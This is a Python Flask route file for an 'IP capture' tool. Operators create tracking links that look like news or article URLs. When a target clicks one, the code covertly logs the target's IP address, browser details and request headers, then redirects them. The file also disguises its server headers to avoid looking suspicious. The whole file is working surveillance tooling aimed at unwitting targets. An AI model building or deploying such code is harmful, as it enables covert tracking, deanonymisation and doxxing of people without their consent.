"""IP Capture & Redirect — web routes for stealthy link tracking."""

from flask import (Blueprint, render_template, request, jsonify,
                   redirect, Response)
from web.auth import login_required

ipcapture_bp = Blueprint('ipcapture', __name__)


def _svc():
    from modules.ipcapture import get_ip_capture
    return get_ip_capture()


# ── Management UI ────────────────────────────────────────────────────────────

@ipcapture_bp.route('/ipcapture/')
@login_required
def index():
    return render_template('ipcapture.html')


@ipcapture_bp.route('/ipcapture/links', methods=['GET'])
@login_required
def list_links():
    svc = _svc()
    links = svc.list_links()
    for l in links:
        l['stats'] = svc.get_stats(l['key'])
    return jsonify({'ok': True, 'links': links})


@ipcapture_bp.route('/ipcapture/links', methods=['POST'])
@login_required
def create_link():
    data = request.get_json(silent=True) or {}
    target = data.get('target_url', '').strip()
    if not target:
        return jsonify({'ok': False, 'error': 'Target URL required'})
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
    result = _svc().create_link(
        target_url=target,
        name=data.get('name', ''),
        disguise=data.get('disguise', 'article'),
    )
    return jsonify(result)


@ipcapture_bp.route('/ipcapture/links/<key>', methods=['GET'])
@login_required
def get_link(key):
    svc = _svc()
    link = svc.get_link(key)
    if not link:
        return jsonify({'ok': False, 'error': 'Link not found'})
    link['stats'] = svc.get_stats(key)
    return jsonify({'ok': True, 'link': link})


@ipcapture_bp.route('/ipcapture/links/<key>', methods=['DELETE'])
@login_required
def delete_link(key):
    if _svc().delete_link(key):
        return jsonify({'ok': True})
    return jsonify({'ok': False, 'error': 'Link not found'})


@ipcapture_bp.route('/ipcapture/links/<key>/export')
@login_required
def export_captures(key):
    fmt = request.args.get('format', 'json')
    data = _svc().export_captures(key, fmt)
    mime = 'text/csv' if fmt == 'csv' else 'application/json'
    ext = 'csv' if fmt == 'csv' else 'json'
    return Response(data, mimetype=mime,
                    headers={'Content-Disposition': f'attachment; filename=captures_{key}.{ext}'})


# ── Capture Endpoints (NO AUTH — accessed by targets) ────────────────────────

@ipcapture_bp.route('/c/<key>')
def capture_short(key):
    """Short capture URL — /c/xxxxx"""
    return _do_capture(key)


@ipcapture_bp.route('/article/<path:subpath>')
def capture_article(subpath):
    """Article-style capture URL — /article/2026/03/title-slug"""
    svc = _svc()
    full_path = '/article/' + subpath
    link = svc.find_by_path(full_path)
    if not link:
        return Response('Not Found', status=404)
    return _do_capture(link['key'])


@ipcapture_bp.route('/news/<path:subpath>')
def capture_news(subpath):
    """News-style capture URL."""
    svc = _svc()
    full_path = '/news/' + subpath
    link = svc.find_by_path(full_path)
    if not link:
        return Response('Not Found', status=404)
    return _do_capture(link['key'])


@ipcapture_bp.route('/stories/<path:subpath>')
def capture_stories(subpath):
    """Stories-style capture URL."""
    svc = _svc()
    full_path = '/stories/' + subpath
    link = svc.find_by_path(full_path)
    if not link:
        return Response('Not Found', status=404)
    return _do_capture(link['key'])


@ipcapture_bp.route('/p/<path:subpath>')
def capture_page(subpath):
    """Page-style capture URL."""
    svc = _svc()
    full_path = '/p/' + subpath
    link = svc.find_by_path(full_path)
    if not link:
        return Response('Not Found', status=404)
    return _do_capture(link['key'])


@ipcapture_bp.route('/read/<path:subpath>')
def capture_read(subpath):
    """Read-style capture URL."""
    svc = _svc()
    full_path = '/read/' + subpath
    link = svc.find_by_path(full_path)
    if not link:
        return Response('Not Found', status=404)
    return _do_capture(link['key'])


def _do_capture(key):
    """Perform the actual IP capture and redirect."""
    svc = _svc()
    link = svc.get_link(key)
    if not link or not link.get('active'):
        return Response('Not Found', status=404)

    # Get real client IP
    ip = (request.headers.get('X-Forwarded-For', '').split(',')[0].strip()
          or request.headers.get('X-Real-IP', '')
          or request.remote_addr)

    # Record capture with all available metadata
    svc.record_capture(
        key=key,
        ip=ip,
        user_agent=request.headers.get('User-Agent', ''),
        accept_language=request.headers.get('Accept-Language', ''),
        referer=request.headers.get('Referer', ''),
        headers=dict(request.headers),
    )

    # Fast 302 redirect — no page render, minimal latency
    target = link['target_url']
    resp = redirect(target, code=302)
    # Clean headers — no suspicious indicators
    resp.headers.pop('X-Content-Type-Options', None)
    resp.headers['Server'] = 'nginx'
    resp.headers['Cache-Control'] = 'no-cache'
    return resp
